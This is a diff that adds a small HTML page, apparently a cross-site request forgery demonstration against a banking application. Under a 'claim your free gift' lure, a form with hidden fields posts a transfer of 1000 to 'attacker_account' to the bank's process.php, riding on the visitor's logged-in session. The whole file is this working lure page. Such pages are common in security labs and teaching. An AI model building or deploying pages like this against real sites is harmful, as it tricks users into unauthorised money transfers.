@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Gift!</title>
+</head>
+<body>
+    <h1>🎁 Click here to claim your free gift!</h1>
+
+    <!-- Hidden auto-submitting form to same bank process.php -->
+    <form action="process.php" method="POST">
+        <input type="hidden" name="amount" value="1000">
+        <input type="hidden" name="to" value="attacker_account">
+        <input type="submit" value="Claim Gift!">
+    </form>
+</body>
+</html>
